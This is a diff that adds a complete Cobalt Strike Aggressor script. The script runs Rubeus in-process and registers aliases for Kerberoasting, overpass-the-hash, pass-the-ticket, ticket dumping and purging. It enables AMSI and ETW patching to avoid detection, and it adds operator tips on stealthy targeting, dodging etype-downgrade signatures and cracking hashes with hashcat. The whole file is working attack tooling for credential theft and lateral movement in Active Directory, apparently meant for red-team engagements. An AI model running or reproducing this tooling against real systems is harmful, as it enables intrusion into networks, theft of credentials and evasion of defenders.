@@ -1,0 +1,225 @@
+# ============================================================
+#  kerb_ops_inproc.cna
+#  In-process Rubeus wrappers (no execute-assembly fork&run)
+#  Backends: InlineExecute-Assembly  OR  BOF.NET
+#  Aliases:  roast | opth | ptt | kdump | kpurge
+# ============================================================
+
+# ---- Configuration -----------------------------------------
+# Choose backend: "IEA" (InlineExecute-Assembly) or "BOFNET"
+$KERB_BACKEND     = "IEA";
+
+# InlineExecute-Assembly: path to the BOF + Rubeus.exe (.NET assembly)
+$IEA_BOF_X64      = "/opt/tools/InlineExecute-Assembly/inlineExecute-Assembly.x64.o";
+$RUBEUS_EXE       = "/opt/tools/Rubeus.exe";
+
+# BOF.NET: path to the BOF.NET loader + Rubeus.dll
+$BOFNET_BOF_X64   = "/opt/tools/BOFNET/bofnet.x64.o";
+$RUBEUS_DLL       = "/opt/tools/Rubeus.dll";
+$RUBEUS_DLL_CLASS = "Rubeus.Program";    # entrypoint class in Rubeus.dll
+
+# AMSI/ETW bypass toggle passed to InlineExecute-Assembly (it patches in-proc)
+$IEA_PATCH_AMSI   = "true";
+$IEA_PATCH_ETW    = "true";
+
+# ---- Helpers -----------------------------------------------
+sub readbof {
+    local('$h $d');
+    $h = openf($1);
+    $d = readb($h, -1);
+    closef($h);
+    return $d;
+}
+
+sub backend_check {
+    local('$bid');
+    $bid = $1;
+    if ($KERB_BACKEND eq "IEA") {
+        if (!-exists $IEA_BOF_X64) { berror($bid, "InlineExecute-Assembly BOF not found: $IEA_BOF_X64"); return false; }
+        if (!-exists $RUBEUS_EXE)  { berror($bid, "Rubeus.exe not found: $RUBEUS_EXE"); return false; }
+    }
+    else if ($KERB_BACKEND eq "BOFNET") {
+        if (!-exists $BOFNET_BOF_X64) { berror($bid, "BOF.NET loader not found: $BOFNET_BOF_X64"); return false; }
+        if (!-exists $RUBEUS_DLL)     { berror($bid, "Rubeus.dll not found: $RUBEUS_DLL"); return false; }
+    }
+    else {
+        berror($bid, "Unknown \$KERB_BACKEND '$KERB_BACKEND' (use IEA or BOFNET)");
+        return false;
+    }
+    return true;
+}
+
+# Central dispatch: takes a Rubeus argument string, runs it in-process.
+sub run_rubeus_inproc {
+    local('$bid $argstr $bof $asm $args');
+    $bid = $1; $argstr = $2;
+
+    if (barch($bid) ne "x64") {
+        berror($bid, "[kerb_ops] x64 backends configured here. Add x86 paths if you need them.");
+        return;
+    }
+
+    btask($bid, "[kerb_ops/$KERB_BACKEND] Rubeus " . $argstr);
+
+    if ($KERB_BACKEND eq "IEA") {
+        # InlineExecute-Assembly arg packing:
+        #   assembly bytes, assembly args, amsi flag, etw flag, appdomain name, pipe/output opts
+        $asm = readbof($RUBEUS_EXE);   # the .NET assembly bytes
+        # Pack: amsi(bool as str) etw(bool) appdomain(str) args(str) asmlen(int) asm(bytes)
+        $args = bof_pack($bid, "iizzb",
+                         iff($IEA_PATCH_AMSI eq "true", 1, 0),
+                         iff($IEA_PATCH_ETW  eq "true", 1, 0),
+                         "RubeusDomain",          # ephemeral AppDomain name
+                         $argstr,                  # arguments to Rubeus
+                         $asm);                    # assembly bytes
+        $bof = readbof($IEA_BOF_X64);
+        beacon_inline_execute($bid, $bof, "go", $args);
+    }
+    else {  # BOFNET
+        # BOF.NET model: load Rubeus.dll once, then invoke its entrypoint with args.
+        # bofnet_execute drives the loader; args are the Rubeus CLI tokens.
+        bofnet_init($bid);                                  # ensure runtime is up
+        bofnet_load($bid, $RUBEUS_DLL);                     # load assembly (idempotent-ish)
+        bofnet_execute($bid, $RUBEUS_DLL_CLASS, $argstr);   # run Rubeus.Program.Main(args)
+    }
+}
+
+# ---- BOF.NET convenience shims (no-op if functions already provided) ----
+# If you use the official BOF.NET .cna, these are already defined and you can
+# delete this block. Provided so the wrapper is self-contained.
+sub bofnet_init    { return; }   # official bofnet.cna defines the real one
+sub bofnet_load    { return; }
+sub bofnet_execute {
+    # Fallback: drive the BOF.NET loader BOF directly.
+    local('$bid $klass $argstr $bof $args');
+    $bid = $1; $klass = $2; $argstr = $3;
+    $args = bof_pack($bid, "zz", $klass, $argstr);
+    $bof  = readbof($BOFNET_BOF_X64);
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+# ============================================================
+#  roast  -  Kerberoasting, AES-aware, targeted-first
+# ============================================================
+alias roast {
+    local('$bid $arg $cmd');
+    $bid = $1;
+    if (!backend_check($bid)) { return; }
+
+    $arg = substr($0, strlen("roast "));
+    $arg = ["$arg" trim];
+
+    if ($arg eq "") {
+        $cmd = "kerberoast /rc4opsec /nowrap";
+        btask($bid, "[kerb_ops] No target -> /rc4opsec sweep (skips AES-capable accts). Prefer /user: for stealth.");
+    }
+    else if ($arg ismatch '/user:.*' || $arg ismatch '/ou:.*' || $arg ismatch '/spn:.*') {
+        $cmd = "kerberoast $arg /nowrap";
+    }
+    else {
+        $cmd = "kerberoast /user:$arg /nowrap";
+    }
+    run_rubeus_inproc($bid, $cmd);
+    btask($bid, "[kerb_ops] Crack offline: hashcat -m 13100 <hashes> <wordlist>");
+}
+
+# ============================================================
+#  opth  -  Overpass-the-hash, AES-preferred, sacrificial session
+# ============================================================
+alias opth {
+    local('$bid $user $domain $key $keypart $extra $cmd');
+    $bid = $1;
+    if (!backend_check($bid)) { return; }
+
+    if (size(@_) < 4) {
+        berror($bid, "Usage: opth <user> <domain> <aes256key | rc4=nthash> [extra flags]");
+        return;
+    }
+    $user = $2; $domain = $3; $key = $4;
+    $extra = "";
+    if (size(@_) > 4) { $extra = join(" ", sublist(@_, 4)); }
+
+    if ($key ismatch 'rc4=.*') {
+        $keypart = "/rc4:" . substr($key, 4);
+        btask($bid, "[kerb_ops] WARNING: RC4 etype downgrade — top OPtH signature. Prefer AES256.");
+    } else {
+        $keypart = "/aes256:$key";
+    }
+
+    btask($bid, "[kerb_ops] OPtH via sacrificial netonly session (protects operator creds).");
+    $cmd = "asktgt /user:$user /domain:$domain $keypart /createnetonly:C:\\Windows\\System32\\cmd.exe /ptt $extra";
+    run_rubeus_inproc($bid, $cmd);
+}
+
+# ============================================================
+#  ptt  -  Pass-the-ticket into current/sacrificial session
+# ============================================================
+alias ptt {
+    local('$bid $ticket $cmd');
+    $bid = $1;
+    if (!backend_check($bid)) { return; }
+
+    if (size(@_) != 2) {
+        berror($bid, "Usage: ptt <base64-ticket-blob>");
+        return;
+    }
+    $ticket = $2;
+
+    btask($bid, "[kerb_ops] Injecting ticket. Prefer a sacrificial session to avoid clobbering operator klist.");
+    $cmd = "ptt /ticket:$ticket";
+    run_rubeus_inproc($bid, $cmd);
+    btask($bid, "[kerb_ops] Verify: kdump   |   Cleanup: kpurge");
+}
+
+# ============================================================
+#  kdump  -  Triage + dump cached tickets (SYSTEM for other sessions)
+# ============================================================
+alias kdump {
+    local('$bid $arg');
+    $bid = $1;
+    if (!backend_check($bid)) { return; }
+
+    $arg = substr($0, strlen("kdump"));
+    $arg = ["$arg" trim];
+
+    if (!-isadmin $bid) {
+        btask($bid, "[kerb_ops] Not elevated — cross-session dump needs SYSTEM; you'll only see your own tickets.");
+    }
+
+    btask($bid, "[kerb_ops] Triage:");
+    run_rubeus_inproc($bid, "triage");
+
+    if ($arg eq "") { run_rubeus_inproc($bid, "dump /nowrap"); }
+    else            { run_rubeus_inproc($bid, "dump $arg /nowrap"); }
+}
+
+# ============================================================
+#  kpurge  -  Cleanup injected tickets
+# ============================================================
+alias kpurge {
+    local('$bid');
+    $bid = $1;
+    if (!backend_check($bid)) { return; }
+    btask($bid, "[kerb_ops] Purging tickets from current session.");
+    run_rubeus_inproc($bid, "purge");
+}
+
+# ---- Help registration -------------------------------------
+beacon_command_register("roast",
+    "Kerberoast (in-process, AES-aware)",
+    "roast [/user:NAME | /ou:DN | <empty for /rc4opsec sweep>]\nTargeted is quietest. hashcat -m 13100.");
+beacon_command_register("opth",
+    "Overpass-the-hash (in-process, sacrificial session)",
+    "opth <user> <domain> <aes256key | rc4=nthash> [extra]\nPrefer AES256 to avoid etype downgrade.");
+beacon_command_register("ptt",
+    "Pass-the-ticket (in-process)",
+    "ptt <base64-ticket-blob>\nVerify with kdump, clean up with kpurge.");
+beacon_command_register("kdump",
+    "Triage + dump tickets (in-process)",
+    "kdump [/luid:0xXXXX]\nNeeds SYSTEM for other logon sessions.");
+beacon_command_register("kpurge",
+    "Purge injected tickets (in-process)",
+    "kpurge\nEngagement hygiene.");
+
+print_good("[kerb_ops] In-process wrapper loaded. Backend: $KERB_BACKEND");
+print_good("[kerb_ops] Aliases: roast, opth, ptt, kdump, kpurge");
